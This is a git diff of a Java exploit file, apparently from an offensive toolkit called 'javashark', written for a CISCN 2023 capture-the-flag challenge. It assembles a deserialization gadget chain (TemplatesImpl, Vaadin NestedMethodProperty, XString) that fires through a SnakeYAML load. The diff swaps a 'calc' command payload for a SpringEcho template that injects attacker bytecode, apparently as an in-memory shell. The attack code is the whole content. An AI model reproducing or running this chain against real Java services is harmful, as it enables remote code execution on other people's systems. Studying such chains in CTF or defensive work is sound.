@@ -5,6 +5,7 @@ import dev.silente.javashark.gadget.jdk.GXString;
 import dev.silente.javashark.gadget.vaadin.GNestedMethodProperty;
 import dev.silente.javashark.poc.SnakeYamlWays;
 import dev.silente.javashark.sink.jdk.STemplates;
+import dev.silente.javashark.template.echo.SpringEcho;
 import dev.silente.javashark.utils.MiscUtils;
 import dev.silente.javashark.utils.SerializeUtils;
 
@@ -15,10 +16,10 @@ public class CISCN2023 {
     public static void main(String[] args) throws Exception {
 
         // 1 cmd
-        Object exp = STemplates.createTemplatesImpl("calc");
+//        Object exp = STemplates.createTemplatesImpl("calc");
 
         // 2 memshell
-//        Object exp = STemplates.getEvilTemplates(MiscUtils.classAsBytes(Evil.class));
+        Object exp = STemplates.getEvilTemplates(MiscUtils.classAsBytes(SpringEcho.class));
 
         Object property = GNestedMethodProperty.toString2Getter(exp);
         Object xstring = GXString.deserialize2ToString(property);
@@ -31,8 +32,6 @@ public class CISCN2023 {
         SnakeYamlWays.load(poc);
     }
 }
-
-
 
 class Myexpect extends Exception {
     private Class[] typeparam;
@@ -62,7 +61,6 @@ class Myexpect extends Exception {
     }
 
     public Object getAnyexcept() throws Exception {
-        System.out.println("getAnyexcept");
         Constructor con = this.targetclass.getConstructor(this.typeparam);
         return con.newInstance(this.typearg);
     }
